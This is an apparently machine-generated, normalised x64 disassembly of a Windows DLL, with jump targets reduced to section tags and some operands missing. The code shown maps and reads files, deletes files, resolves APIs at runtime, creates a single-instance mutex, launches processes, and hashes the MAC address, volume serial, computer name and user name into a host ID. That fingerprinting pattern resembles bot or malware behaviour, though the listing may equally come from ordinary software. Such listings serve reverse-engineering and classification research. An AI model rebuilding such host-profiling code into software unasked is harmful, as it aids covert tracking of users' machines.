mov [ rbx + 0x8 ] rsi
mov rbx [ rsp + 0x48 ]
mov rsi [ rsp + 0x58 ]
add rsp 0x30
pop rdi
retn
sub_18000e860
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rbp
mov [ rsp + 0x18 ] rsi
mov [ rsp + 0x20 ] rdi
push r12
sub rsp 0x30
mov rdi rcx
add rcx 0x50
mov rbp r8
mov r12 rdx
call sub_18001c2b4
mov rcx [ rdi ]
xor r9d r9d
xor r8d r8d
mov [ rsp + 0x20 ] 0x0
lea edx [ r9 + 0x4 ]
call [ MapViewOfFile@IAT ]
mov rsi rax
test rax rax
je r-xdata
lea rcx [ rdi + 0x50 ]
call sub_18001c2bc
xor al al
mov ecx [ rdi + 0x44 ]
mov edx [ rcx + rax ]
mov [ rbp ] edx
add [ rdi + 0x44 ] 0x4
mov ecx [ rbp ]
mov edx 0x1
call sub_18001d210
mov [ r12 ] rax
mov edx [ rdi + 0x44 ]
mov r8d [ rbp ]
add rdx rsi
mov rcx rax
call sub_18001c4a0
mov r11d [ rbp ]
mov rcx rsi
add [ rdi + 0x44 ] r11d
call [ UnmapViewOfFile@IAT ]
lea rcx [ rdi + 0x50 ]
call sub_18001c2bc
mov al 0x1
jmp r-xdata
mov rbx [ rsp + 0x40 ]
mov rbp [ rsp + 0x48 ]
mov rsi [ rsp + 0x50 ]
mov rdi [ rsp + 0x58 ]
add rsp 0x30
pop r12
retn
sub_18000e930
cmp [ rcx + 0x8 ] 0x0
mov r10 rdx
mov r9 rcx
je r-xdata
cmp [ rcx ] 0x0
je r-xdata
jmp sub_18000e790
xor al al
retn
mov ecx [ rcx + 0x40 ]
mov eax r8d
lea rdx [ rcx + rax + 0x4 ]
mov eax [ r9 + 0x3c ]
cmp rax rdx
jbe r-xdata
mov rdx r10
mov rcx r9
jmp sub_18000e6e0
sub_18000e970
mov [ rsp + 0x10 ] rbx
mov [ rsp + 0x18 ] rbp
mov [ rsp + 0x20 ] rsi
push rdi
sub rsp 0x30
mov rbx rcx
mov rcx [ rcx + 0x8 ]
mov rbp rdx
xor edx edx
mov rsi r8
call [ GetFileSize@IAT ]
mov edx [ rbx + 0x38 ]
mov rcx [ rbx + 0x8 ]
sub eax edx
cmp eax 0x5
jae r-xdata
xor r9d r9d
xor r8d r8d
call [ SetFilePointer@IAT ]
mov rcx [ rbx + 0x8 ]
cmp eax 0xffffffff
jne r-xdata
call [ CloseHandle@IAT ]
cmp [ rbx + 0x28 ] 0x8
lea rcx [ rbx + 0x10 ]
jb r-xdata
xor edi edi
lea r9 [ rsp + 0x40 ]
mov rdx rsi
lea r8d [ rdi + 0x4 ]
mov [ rsp + 0x40 ] edi
mov [ rsp + 0x20 ] rdi
call [ ReadFile@IAT ]
cmp [ rsp + 0x40 ] 0x4
je r-xdata
call [ CloseHandle@IAT ]
xor edi edi
xor al al
mov [ rbx + 0x38 ] edi
jmp r-xdata
call [ DeleteFileW@IAT ]
xor edi edi
mov [ rsi ] edi
mov [ rbx + 0x38 ] edi
jmp r-xdata
mov rcx [ rcx ]
add [ rbx + 0x38 ] 0x4
mov ecx [ rsi ]
mov edx 0x1
call sub_18001d210
mov [ rbp ] rax
mov rcx [ rbx + 0x8 ]
test rax rax
jne r-xdata
mov rcx [ rbx + 0x8 ]
call [ CloseHandle@IAT ]
xor al al
jmp r-xdata
mov [ rbx + 0x8 ] rdi
mov al 0x1
mov r8d [ rsi ]
lea r9 [ rsp + 0x40 ]
mov rdx rax
mov [ rsp + 0x20 ] rdi
call [ ReadFile@IAT ]
mov r11d [ rsi ]
cmp r11d [ rsp + 0x40 ]
je r-xdata
call [ CloseHandle@IAT ]
add [ rbx + 0x38 ] 0xfffffffc
xor al al
jmp r-xdata
mov rcx [ rbx + 0x8 ]
add [ rbx + 0x38 ] r11d
call [ CloseHandle@IAT ]
mov rcx [ rbp ]
call sub_18001c80c
mov rcx [ rbx + 0x8 ]
call [ CloseHandle@IAT ]
cmp [ rbx + 0x28 ] 0x8
lea rcx [ rbx + 0x10 ]
jb r-xdata
call [ DeleteFileW@IAT ]
mov [ rbx + 0x8 ] rdi
mov [ rsi ] edi
mov [ rbx + 0x38 ] edi
mov al 0x1
jmp r-xdata
mov rcx [ rcx ]
mov rbx [ rsp + 0x48 ]
mov rbp [ rsp + 0x50 ]
mov rsi [ rsp + 0x58 ]
add rsp 0x30
pop rdi
retn
sub_18000eae0
push rbx
sub rsp 0x20
mov rbx rcx
mov rcx [ rcx ]
test rcx rcx
je r-xdata
cmp [ rbx + 0x8 ] 0x0
je r-xdata
mov eax [ rbx + 0x40 ]
test eax eax
je r-xdata
xor al al
add rsp 0x20
pop rbx
retn
mov rcx rbx
add rsp 0x20
pop rbx
jmp sub_18000e970
mov rcx rbx
add rsp 0x20
pop rbx
jmp sub_18000e860
sub eax [ rbx + 0x44 ]
cmp eax 0x5
jae r-xdata
call [ CloseHandle@IAT ]
xor r11d r11d
mov [ rbx ] r11
mov [ rbx + 0x40 ] r11
sub_18000eb40
mov [ rsp + 0x8 ] rcx
push rbx
sub rsp 0x30
mov [ rsp + 0x20 ] 0xfffffffffffffffe
mov rbx rcx
mov rcx [ rcx ]
test rcx rcx
je r-xdata
mov rcx [ rbx + 0x8 ]
test rcx rcx
je r-xdata
call [ CloseHandle@IAT ]
lea rcx [ rbx + 0x50 ]
call sub_18001c294
nop
cmp [ rbx + 0x28 ] 0x8
jb r-xdata
call [ CloseHandle@IAT ]
mov [ rbx + 0x28 ] 0x7
xor eax eax
mov [ rbx + 0x20 ] rax
mov [ rbx + 0x10 ] ax
add rsp 0x30
pop rbx
retn
mov rcx [ rbx + 0x10 ]
call j_sub_18001c80c
sub_18000ebb0
push rbp
push rsi
push rdi
push r12
push r13
sub rsp 0xb0
mov [ rsp + 0x48 ] 0xfffffffffffffffe
mov [ rsp + 0xf8 ] rbx
mov rax [ rw-data ]
xor rax rsp
mov [ rsp + 0xa0 ] rax
mov rbp r8
mov rsi rdx
mov rdi rcx
xor bl bl
xor r13d r13d
cmp [ rdi + 0x8 ] 0xffffffffffffffff
jne r-xdata
lea ecx [ rax - 0xc ]
call [ Sleep@IAT ]
inc bl
cmp bl 0x5
jb r-xdata
mov al 0x1
jmp r-xdata
mov [ rdi + 0x8 ] r13
cmp [ rdi ] r13
jne r-xdata
mov rcx rsi
call sub_180003190
mov rcx rax
mov [ rsp + 0x30 ] r13
mov [ rsp + 0x28 ] 0x2
mov [ rsp + 0x20 ] 0x4
xor r9d r9d
xor r8d r8d
mov edx 0x40000000
call [ CreateFileW@IAT ]
mov [ rdi + 0x8 ] rax
call [ GetLastError@IAT ]
cmp eax 0x20
jne r-xdata
mov rcx [ rsp + 0xa0 ]
xor rcx rsp
call sub_18001d1f0
mov rbx [ rsp + 0xf8 ]
add rsp 0xb0
pop r13
pop r12
pop rdi
pop rsi
pop rbp
retn
mov rsi r13
mov ecx 0x30
call sub_18001c84c
mov [ rsp + 0x40 ] rax
test rax rax
je r-xdata
mov rbx r13
mov rcx rax
call sub_180008850
mov rbx rax
jmp r-xdata
mov r8d 0x14
lea rdx [ rw-data ]
mov rcx rbx
call sub_1800088c0
lea rdx [ rsp + 0x78 ]
mov rcx rbx
call sub_180009450
lea rdx [ rsp + 0x78 ]
cmp [ rsp + 0x90 ] 0x10
cmovae rdx [ rsp + 0x78 ]
mov rcx r12
call [ GetProcAddress@IAT ]
mov rsi rax
cmp [ rsp + 0x90 ] 0x10
jb r-xdata
lea rcx [ rsp + 0x50 ]
cmp [ rsp + 0x68 ] 0x10
cmovae rcx [ rsp + 0x50 ]
call [ LoadLibraryA@IAT ]
mov r12 rax
test rax rax
je r-xdata
mov r8d 0xb
lea rdx [ rw-data ]
mov rcx rbx
call sub_1800088d0
mov r8d 0xd
lea rdx [ rw-data ]
mov rcx rbx
call sub_1800088c0
lea rdx [ rsp + 0x50 ]
mov rcx rbx
call sub_180009450
nop
lea rcx [ rsp + 0x50 ]
cmp [ rsp + 0x68 ] 0x10
cmovae rcx [ rsp + 0x50 ]
call [ GetModuleHandleA@IAT ]
mov r12 rax
test rax rax
jne r-xdata
mov [ rsp + 0x90 ] 0xf
mov [ rsp + 0x88 ] r13
mov [ rsp + 0x78 ] 0x0
mov rcx [ rsp + 0x78 ]
call j_sub_18001c80c
test rbx rbx
je r-xdata
test rsi rsi
je r-xdata
mov rcx rbx
call sub_180008890
mov rcx rbx
call j_sub_18001c80c
mov [ rdi + 0x3c ] 0x200000
call rsi
mov [ rdi + 0x3c ] eax
jmp r-xdata
mov [ rsp + 0x28 ] rbp
mov eax [ rdi + 0x3c ]
mov [ rsp + 0x20 ] eax
xor r9d r9d
xor edx edx
lea r8d [ r9 + 0x4 ]
or rcx 0xffffffffffffffff
call [ CreateFileMappingW@IAT ]
mov [ rdi ] rax
test rax rax
je r-xdata
mov rbp [ rbp ]
cmp [ rbp + 0x18 ] 0x8
jb r-xdata
cmp [ rsp + 0x68 ] 0x10
jb r-xdata
cmp [ rsp + 0x68 ] 0x10
jb r-xdata
xor al al
mov rcx [ rsp + 0x50 ]
call j_sub_18001c80c
mov rcx [ rsp + 0x50 ]
call j_sub_18001c80c
sub_18000ee10
mov [ rsp + 0x8 ] rcx
push rdi
sub rsp 0x30
mov [ rsp + 0x20 ] 0xfffffffffffffffe
mov [ rsp + 0x48 ] rbx
mov [ rsp + 0x50 ] rbp
mov [ rsp + 0x58 ] rsi
movzx edi r8b
mov ebx edx
mov rsi rcx
xor ebp ebp
mov [ rcx ] rbp
mov [ rcx + 0x8 ] rbp
add rcx 0x10
mov [ rcx + 0x18 ] 0x7
mov [ rcx + 0x10 ] rbp
mov [ rcx ] bp
xor r8d r8d
lea rdx [ r--data ]
call sub_180003b50
nop
mov [ rsi + 0x38 ] ebx
mov [ rsi + 0x3c ] rbp
mov [ rsi + 0x44 ] ebp
mov [ rsi + 0x48 ] dil
lea rcx [ rsi + 0x50 ]
call sub_18001c26c
nop
mov rax rsi
mov rbx [ rsp + 0x48 ]
mov rbp [ rsp + 0x50 ]
mov rsi [ rsp + 0x58 ]
add rsp 0x30
pop rdi
retn
sub_18000eea0
mov [ rsp + 0x8 ] rbx
push rdi
sub rsp 0x40
cmp [ rcx ] 0x0
mov rdi rdx
mov rbx rcx
je r-xdata
cmp [ rdx + 0x18 ] 0x8
jb r-xdata
cmp [ rcx + 0x40 ] 0x0
jne r-xdata
mov rcx rdx
mov rcx [ rdx ]
jmp r-xdata
mov al 0x1
mov rbx [ rsp + 0x50 ]
add rsp 0x40
pop rdi
retn
mov [ rbx + 0x8 ] 0x0
mov rbx [ rsp + 0x50 ]
xor al al
add rsp 0x40
pop rdi
retn
lea rcx [ rbx + 0x10 ]
or r9 0xffffffffffffffff
xor r8d r8d
mov rdx rdi
call sub_180001ac0
mov [ rsp + 0x30 ] 0x0
xor r9d r9d
xor r8d r8d
mov edx 0x80000000
mov [ rsp + 0x28 ] 0x2
mov [ rsp + 0x20 ] 0x3
call [ CreateFileW@IAT ]
mov [ rbx + 0x8 ] rax
cmp rax 0xffffffffffffffff
je r-xdata
sub_18000ef70
push rdi
sub rsp 0x50
mov [ rsp + 0x38 ] 0xfffffffffffffffe
mov [ rsp + 0x60 ] rbx
mov rax [ rw-data ]
xor rax rsp
mov [ rsp + 0x48 ] rax
xor ebx ebx
mov [ rsp + 0x34 ] ebx
mov [ rsp + 0x30 ] ebx
lea rax [ rsp + 0x30 ]
mov [ rsp + 0x20 ] rax
xor r9d r9d
xor r8d r8d
xor edx edx
xor ecx ecx
call GetAdaptersAddresses
mov r11d [ rsp + 0x30 ]
test r11d r11d
je r-xdata
mov eax ebx
mov rcx [ rsp + 0x48 ]
xor rcx rsp
call sub_18001d1f0
mov rbx [ rsp + 0x60 ]
add rsp 0x50
pop rdi
retn
mov eax 0x1c0
mul r11
mov rcx 0xffffffffffffffff
cmovo rax rcx
mov rcx rax
call j_sub_18001c84c
mov rdi rax
lea rax [ rsp + 0x30 ]
mov [ rsp + 0x20 ] rax
mov r9 rdi
xor r8d r8d
xor edx edx
xor ecx ecx
call GetAdaptersAddresses
test eax eax
jne r-xdata
mov rcx rdi
call j_sub_18001c80c#2
jmp r-xdata
mov rax [ rdi + 0x50 ]
mov [ rsp + 0x40 ] rax
mov ecx 0x563c
lea r8d [ rbx + 0x8 ]
lea rdx [ rsp + 0x40 ]
call sub_18000a3b0
movzx ebx ax
shl ebx 0x10
xor ebx 0x563c
mov [ rsp + 0x34 ] ebx
sub_18000f060
push rbx
sub rsp 0x20
mov rbx rcx
mov r8 rdx
mov edx 0x1
xor ecx ecx
call [ CreateMutexW@IAT ]
mov [ rbx + 0x8 ] rax
call [ GetLastError@IAT ]
cmp eax 0xb7
setne al
add rsp 0x20
pop rbx
retn
sub_18000f0a0
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rbp
mov [ rsp + 0x18 ] rsi
push rdi
sub rsp 0x100
mov rdi rdx
mov esi 0x104
mov edx 0x2
mov ecx esi
mov rbp r8
call sub_18001d210
mov r8d esi
mov rcx rdi
mov rdx rax
mov rbx rax
call [ ExpandEnvironmentStringsW@IAT ]
test eax eax
jne r-xdata
or rcx 0xffffffffffffffff
xor eax eax
mov rdi rbx
[ rdi ]
mov rdx rsi
lea r8 [ r--data ]
not rcx
dec rcx
sub rdx rcx
mov rcx rbx
call sub_18001d644
or rcx 0xffffffffffffffff
xor eax eax
mov rdi rbx
mov r8 rbp
[ rdi ]
not rcx
dec rcx
sub rsi rcx
mov rcx rbx
mov rdx rsi
call sub_18001d644
mov r8d esi
xor edx edx
mov rcx rbx
call sub_18001c9f0
mov r8 rbp
mov edx esi
mov rcx rbx
call sub_18001d6cc
jmp r-xdata
lea rax [ r--data ]
lea rdx [ rsp + 0x128 ]
lea rcx [ rsp + 0xe0 ]
mov r8d 0x3
mov [ rsp + 0x128 ] rax
call sub_18001c2e4
lea rdx [ r--data ]
lea rcx [ rsp + 0xe0 ]
call sub_18001c8f0
int3
mov rcx [ rsp + 0x58 ]
call [ CloseHandle@IAT ]
lea r11 [ rsp + 0x100 ]
mov rbx [ r11 + 0x10 ]
mov rbp [ r11 + 0x18 ]
mov rsi [ r11 + 0x20 ]
mov rsp r11
pop rdi
retn
xor edx edx
lea rcx [ rsp + 0x70 ]
lea r8d [ rdx + 0x68 ]
call sub_18001c9f0
xor ecx ecx
xor edx edx
lea rax [ rsp + 0x50 ]
mov [ rsp + 0x78 ] rcx
mov [ rsp + 0x88 ] rcx
mov [ rsp + 0x48 ] rax
lea rax [ rsp + 0x70 ]
mov [ rsp + 0x80 ] rcx
mov [ rsp + 0x40 ] rax
mov [ rsp + 0x38 ] rcx
mov [ rsp + 0x30 ] rcx
mov [ rsp + 0x28 ] ecx
mov [ rsp + 0x98 ] rcx
mov [ rsp + 0x90 ] rcx
mov [ rsp + 0xb8 ] rcx
xor r9d r9d
xor r8d r8d
mov rcx rbx
mov [ rsp + 0x50 ] rdx
mov [ rsp + 0x58 ] rdx
mov [ rsp + 0x60 ] rdx
mov [ rsp + 0x70 ] 0x68
mov [ rsp + 0xac ] 0x101
mov [ rsp + 0x20 ] 0x1
call [ CreateProcessW@IAT ]
mov rcx rbx
mov edi eax
call sub_18001c80c
test edi edi
je r-xdata
sub_18000f280
mov [ rsp + 0x8 ] rbx
push rdi
sub rsp 0x20
cmp [ rcx + 0x8 ] 0x0
lea rax [ r--data ]
mov edi edx
mov [ rcx ] rax
mov rbx rcx
jne r-xdata
lea rax [ r--data ]
mov [ rbx ] rax
test dil 0x1
je r-xdata
xor ecx ecx
call [ CloseHandle@IAT ]
mov rax rbx
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop rdi
retn
mov rcx rbx
call j_sub_18001c80c
sub_18000f2d0
mov rax rsp
push rbp
push r12
push r13
lea rbp [ rax - 0x418 ]
sub rsp 0x500
mov [ rsp + 0x58 ] 0xfffffffffffffffe
mov [ rax + 0x8 ] rbx
mov [ rax + 0x10 ] rsi
mov [ rax + 0x18 ] rdi
mov rax [ rw-data ]
xor rax rsp
mov [ rbp + 0x3f0 ] rax
movsxd r12 edx
mov rdi rcx
xor r13d r13d
mov [ rbp + 0x1e0 ] r13w
xor edx edx
mov r8d 0x206
lea rcx [ rbp + 0x1e2 ]
call sub_18001c9f0
mov [ rbp - 0x50 ] r13w
xor eax eax
mov [ rbp - 0x4e ] rax
mov [ rbp - 0x46 ] rax
mov [ rbp - 0x3e ] rax
mov [ rbp - 0x36 ] eax
mov [ rbp - 0x32 ] ax
mov [ rbp - 0x30 ] r13w
xor edx edx
mov r8d 0x200
lea rcx [ rbp - 0x2e ]
call sub_18001c9f0
mov [ rsp + 0x48 ] r13
mov rcx rdi
call sub_18000ef70
mov [ rsp + 0x38 ] r13d
mov [ rsp + 0x30 ] r13
lea rax [ rsp + 0x50 ]
mov [ rsp + 0x28 ] rax
lea rax [ rsp + 0x54 ]
mov [ rsp + 0x20 ] rax
lea r9 [ rsp + 0x48 ]
mov r8d 0x208
lea rdx [ rbp + 0x1e0 ]
xor ecx ecx
call [ GetVolumeInformationW@IAT ]
mov [ rsp + 0x40 ] 0xf
lea rdx [ rsp + 0x40 ]
lea rcx [ rbp - 0x50 ]
call [ GetComputerNameW@IAT ]
mov [ rsp + 0x40 ] 0x100
lea rdx [ rsp + 0x40 ]
lea rcx [ rbp - 0x30 ]
call [ GetUserNameW@IAT ]
mov [ rbp - 0x60 ] 0x7
mov [ rbp - 0x68 ] r13
mov [ rbp - 0x78 ] r13w
xor eax eax
or rcx 0xffffffffffffffff
lea rdi [ rbp - 0x50 ]
[ rdi ]
not rcx
lea r8 [ rcx - 0x1 ]
lea rdx [ rbp - 0x50 ]
lea rcx [ rbp - 0x78 ]
call sub_180003b50
nop
mov [ rsp + 0x78 ] 0x7
mov [ rsp + 0x70 ] r13
mov [ rsp + 0x60 ] r13w
xor eax eax
or rcx 0xffffffffffffffff
lea rdi [ rbp - 0x30 ]
[ rdi ]
not rcx
lea r8 [ rcx - 0x1 ]
lea rdx [ rbp - 0x30 ]
lea rcx [ rsp + 0x60 ]
call sub_180003b50
mov r11d 0x811c9dc5
mov edi r11d
mov r8d r13d
mov rsi 0xcccccccccccccccd
mov rax rsi
mov rbx [ rbp - 0x68 ]
mul rbx
shr rdx 0x3
inc rdx
mov r10 [ rbp - 0x60 ]
mov r9 [ rbp - 0x78 ]
test rbx rbx
je r-xdata
mov rcx r13
mov rax rsi
mov r8 [ rsp + 0x70 ]
mul r8
shr rdx 0x3
inc rdx
mov rsi [ rsp + 0x78 ]
mov rbx [ rsp + 0x60 ]
test r8 r8
je r-xdata
lea rcx [ rbp - 0x78 ]
cmp r10 0x8
cmovae rcx r9
movzx ecx [ rcx + r8 * 2 ]
imul rdi rdi 0x1000193
xor rdi rcx
add r8 rdx
cmp r8 rbx
jb r-xdata
mov edx [ rw-data ]
xor rdx r12
xor rdx r11
xor rdx rdi
xor [ rsp + 0x48 ] rdx
cmp rsi 0x8
jb r-xdata
nop [ rax + rax ] eax
mov [ rsp + 0x78 ] 0x7
mov [ rsp + 0x70 ] r13
mov [ rsp + 0x60 ] r13w
cmp r10 0x8
jb r-xdata
mov rcx rbx
call j_sub_18001c80c
mov r10 [ rbp - 0x60 ]
mov r9 [ rbp - 0x78 ]
lea rax [ rsp + 0x60 ]
cmp rsi 0x8
cmovae rax rbx
movzx eax [ rax + rcx * 2 ]
imul r11 r11 0x1000193
xor r11 rax
add rcx rdx
cmp rcx r8
jb r-xdata
mov rax [ rsp + 0x48 ]
shl rax 0x20
mov rcx [ rbp + 0x3f0 ]
xor rcx rsp
call sub_18001d1f0
lea r11 [ rsp + 0x500 ]
mov rbx [ r11 + 0x20 ]
mov rsi [ r11 + 0x28 ]
mov rdi [ r11 + 0x30 ]
mov rsp r11
pop r13
pop r12
pop rbp
retn
mov rcx r9
call j_sub_18001c80c
sub_18000f5d0
sub rsp 0x38
mov [ rsp + 0x20 ] 0xfffffffffffffffe
mov ecx 0x78
call sub_18001c84c
mov [ rsp + 0x48 ] rax
test rax rax
je r-xdata
xor eax eax
mov rcx rax
call sub_180013db0
nop
jmp r-xdata
add rsp 0x38
retn
sub_18000f610
sub rsp 0x38
mov [ rsp + 0x20 ] 0xfffffffffffffffe
mov ecx 0x58
call sub_18001c84c
mov [ rsp + 0x48 ] rax
test rax rax
je r-xdata
xor eax eax
mov rcx rax
call sub_180013c40
nop
jmp r-xdata
add rsp 0x38
retn
sub_18000f650
mov [ rsp + 0x8 ] rbx
push rdi
sub rsp 0x20
lea rax [ r--data ]
mov ebx edx
mov rdi rcx
mov [ rcx ] rax
call sub_1800124b0
test bl 0x1
je r-xdata
mov rax rdi
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop rdi
retn
mov rcx rdi
call j_sub_18001c80c
sub_18000f690
push rbp
push rsi
push rdi
push r12
push r13
push r14
push r15
lea rbp [ rsp - 0x430 ]
sub rsp 0x530
mov [ rsp + 0x68 ] 0xfffffffffffffffe
mov [ rsp + 0x580 ] rbx
mov rax [ rw-data ]
xor rax rsp
mov [ rbp + 0x420 ] rax
mov r14 rdx
mov rbx rcx
mov [ rsp + 0x60 ] rdx
lea rcx [ rsp + 0x30 ]
call sub_180008850
nop
mov r8d 0xb
lea rdx [ rw-data ]
lea rcx [ rsp + 0x30 ]
call sub_1800088d0
xor r15d r15d
mov [ rbp + 0x210 ] r15w
xor edx edx
mov r8d 0x206
lea rcx [ rbp + 0x212 ]
call sub_18001c9f0
mov rdx [ r14 ]
movzx eax [ rdx + 0xa ]
add eax 0xffffffcd
or r13 0xffffffffffffffff
cmp eax 0x9
ja r-xdata
lea rcx [ rsp + 0x30 ]
call sub_180008890
nop
mov rdi [ r14 + 0x8 ]
test rdi rdi
je r-xdata
cdqe
lea rdi [ __dos_header ]
mov ecx [ rdi + rax * 4 + 0x10074 ]
add rcx rdi
jmp rcx
mov rcx [ rbp + 0x420 ]
xor rcx rsp
call sub_18001d1f0
mov rbx [ rsp + 0x580 ]
add rsp 0x530
pop r15
pop r14
pop r13
pop r12
pop rdi
pop rsi
pop rbp
retn
[ rdi + 0x8 ]
jne r-xdata
mov esi r15d
mov rax [ rdx + 0x20 ]
cmp rax [ rw-data ]
jb r-xdata
mov rdx r14
lea rcx [ rbp - 0x30 ]
call sub_1800039b0
mov rcx rax
call sub_180010670
movzx esi ax
movzx edx ax
mov rcx rbx
call sub_180010380
mov r12d eax
mov r8d 0x3e
lea rdx [ rw-data ]
lea rcx [ rsp + 0x30 ]
call sub_1800088c0
test r12d r12d
lea rdi [ rbx + 0xf8 ]
jne r-xdata
mov rdx r14
lea rcx [ rsp + 0x70 ]
call sub_1800039b0
mov rcx rax
call sub_180010670
movzx esi ax
movzx edx ax
mov rcx rbx
call sub_1800103f0
mov r12d eax
mov r8d 0x3c
lea rdx [ rw-data ]
lea rcx [ rsp + 0x30 ]
call sub_1800088c0
test r12d r12d
lea rdi [ rbx + 0xf8 ]
jne r-xdata
mov rdx r14
lea rcx [ rbp - 0x60 ]
call sub_1800039b0
mov rcx rax
call sub_180010670
movzx esi ax
movzx edx ax
mov rcx rbx
call sub_1800108c0
mov r12d eax
mov r8d 0x3c
lea rdx [ rw-data ]
lea rcx [ rsp + 0x30 ]
call sub_1800088c0
test r12d r12d
lea rdi [ rbx + 0xf8 ]
jne r-xdata
mov esi r15d
mov rax [ rdx + 0x20 ]
cmp rax [ rw-data ]
jb r-xdata
mov rdx r14
lea rcx [ rbp - 0x70 ]
call sub_1800039b0
mov rcx rax
call sub_180010670
movzx r12d ax
movzx edx ax
mov rcx rbx
call sub_180010a50
mov esi eax
cmp eax 0xffffffff
je r-xdata
mov rdx r14
lea rcx [ rbp - 0x50 ]
call sub_1800039b0
mov rcx rax
call sub_180010670
movzx esi ax
mov edx esi
mov rcx rbx
call sub_180010460
mov r12d eax
mov r8d 0x6c
lea rdx [ rw-data ]
lea rcx [ rsp + 0x30 ]
call sub_1800088c0
test r12d r12d
lea rdi [ rbx + 0xf8 ]
jne r-xdata
mov edx [ rdx + 0xc ]
mov rcx rbx
call sub_180011950
nop
mov rax [ rdi ]
mov rcx rdi
call [ rax ]
[ rdi + 0xc ]
jne r-xdata
mov r8d 0x3c
lea rdx [ rw-data ]
lea rcx [ rsp + 0x30 ]
call sub_1800088c0
test esi esi
lea rdi [ rbx + 0xf8 ]
jne r-xdata
mov r8d eax
mov rdx [ rdx + 0x18 ]
mov rcx rbx
call sub_1800111f0
mov esi eax
test eax eax
je r-xdata
cmp [ rdi + 0x18 ] 0x8
jb r-xdata
lea rdi [ rbx + 0x120 ]
cmp [ rdi + 0x18 ] 0x8
jb r-xdata
lea rdi [ rbx + 0x120 ]
cmp [ rdi + 0x18 ] 0x8
jb r-xdata
lea rdi [ rbx + 0x120 ]
mov r8d 0x3e
lea rdx [ rw-data ]
lea rcx [ rsp + 0x30 ]
call sub_1800088c0
test esi esi
lea rdi [ rbx + 0xf8 ]
jne r-xdata
mov r8d eax
mov rdx [ rdx + 0x18 ]
mov rcx rbx
call sub_180012a20
mov esi eax
test eax eax
je r-xdata
mov r8d 0x76
lea rdx [ rw-data ]
lea rcx [ rsp + 0x30 ]
call sub_1800088c0
test eax eax
js r-xdata
cmp [ rdi + 0x18 ] 0x8
jb r-xdata
lea rdi [ rbx + 0x120 ]
mov rax [ rdi ]
mov rcx rdi
call [ rax + 0x8 ]
cmp [ rdi + 0x18 ] 0x8
jb r-xdata
lea rdi [ rbx + 0x120 ]
mov rdx r14
lea rcx [ rbp - 0x40 ]
call sub_1800039b0
mov r8d esi
mov rdx rax
mov rcx rbx
call sub_180011380
lea rdx [ rbp + 0xf8 ]
lea rcx [ rsp + 0x30 ]
call sub_1800092e0
cmp [ rax + 0x18 ] 0x8
jb r-xdata
mov rdi [ rdi ]
lea rdx [ rbp + 0x148 ]
lea rcx [ rsp + 0x30 ]
call sub_1800092e0
cmp [ rax + 0x18 ] 0x8
jb r-xdata
mov rdi [ rdi ]
lea rdx [ rbp + 0x1e8 ]
lea rcx [ rsp + 0x30 ]
call sub_1800092e0
cmp [ rax + 0x18 ] 0x8
jb r-xdata
mov rdi [ rdi ]
cmp [ rdi + 0x18 ] 0x8
jb r-xdata
lea rdi [ rbx + 0x120 ]
mov rdx r14
lea rcx [ rbp - 0x80 ]
call sub_1800039b0
mov r8d esi
mov rdx rax
mov rcx rbx
call sub_180011380
lea rdx [ rbp + 0x120 ]
lea rcx [ rsp + 0x30 ]
call sub_1800092e0
cmp [ rax + 0x18 ] 0x8
jb r-xdata
mov rdi [ rdi ]
test esi esi
jle r-xdata
cmp eax 0x1
jg r-xdata
lea rdx [ rbp + 0x170 ]
lea rcx [ rsp + 0x30 ]
call sub_1800092e0
cmp [ rax + 0x18 ] 0x8
jb r-xdata
mov rdi [ rdi ]
lea rdx [ rbp + 0x1c0 ]
lea rcx [ rsp + 0x30 ]
call sub_1800092e0
cmp [ rax + 0x18 ] 0x8
jb r-xdata
mov rdi [ rdi ]
movzx r9d si
mov [ rsp + 0x20 ] rdi
mov r8 rax
mov edx 0x104
lea rcx [ rbp + 0x210 ]
call sub_18001d620
cmp [ rbp + 0x110 ] 0x8
jb r-xdata
mov rax [ rax ]
movzx r9d si
mov [ rsp + 0x20 ] rdi
mov r8 rax
mov edx 0x104
lea rcx [ rbp + 0x210 ]
call sub_18001d620
cmp [ rbp + 0x160 ] 0x8
jb r-xdata
mov rax [ rax ]
movzx r9d si
mov [ rsp + 0x20 ] rdi
mov r8 rax
mov edx 0x104
lea rcx [ rbp + 0x210 ]
call sub_18001d620
cmp [ rbp + 0x200 ] 0x8
jb r-xdata
mov rax [ rax ]
lea rdx [ rbp + 0x198 ]
lea rcx [ rsp + 0x30 ]
call sub_1800092e0
cmp [ rax + 0x18 ] 0x8
jb r-xdata
mov rdi [ rdi ]
movzx r9d r12w
mov [ rsp + 0x20 ] rdi
mov r8 rax
mov edx 0x104
lea rcx [ rbp + 0x210 ]
call sub_18001d620
cmp [ rbp + 0x138 ] 0x8
jb r-xdata
mov rax [ rax ]
lea rdi [ rbx + 0x120 ]
lea rdi [ rbx + 0xf8 ]
jmp r-xdata
mov r8d 0x3e
lea rdx [ rw-data ]
lea rcx [ rsp + 0x30 ]
call sub_1800088c0
mov [ rsp + 0x20 ] rdi
mov r9d esi
mov r8 rax
mov edx 0x104
lea rcx [ rbp + 0x210 ]
call sub_18001d620
cmp [ rbp + 0x188 ] 0x8
jb r-xdata
mov rax [ rax ]
mov [ rsp + 0x20 ] rdi
mov r9d esi
mov r8 rax
mov edx 0x104
lea rcx [ rbp + 0x210 ]
call sub_18001d620
cmp [ rbp + 0x1d8 ] 0x8
jb r-xdata
mov rax [ rax ]
mov [ rbp + 0x110 ] 0x7
mov [ rbp + 0x108 ] r15
mov [ rbp + 0xf8 ] r15w
mov [ rbp + 0xc0 ] 0x7
mov [ rbp + 0xb8 ] r15
mov [ rbp + 0xa8 ] r15w
xor eax eax
mov rcx r13
lea rdi [ rbp + 0x210 ]
[ rdi ]
not rcx
lea r8 [ rcx - 0x1 ]
lea rdx [ rbp + 0x210 ]
lea rcx [ rbp + 0xa8 ]
call sub_180003b50
nop
mov rax [ r14 ]
test r12d r12d
setne r9b
mov r8d [ rax + 0xc ]
lea rdx [ rbp + 0xa8 ]
mov rcx rbx
call sub_180011540
nop
cmp [ rbp + 0xc0 ] 0x8
jb r-xdata
mov rcx [ rbp + 0xf8 ]
call j_sub_18001c80c
mov [ rbp + 0x160 ] 0x7
mov [ rbp + 0x158 ] r15
mov [ rbp + 0x148 ] r15w
mov [ rbp + 0xe8 ] 0x7
mov [ rbp + 0xe0 ] r15
mov [ rbp + 0xd0 ] r15w
xor eax eax
mov rcx r13
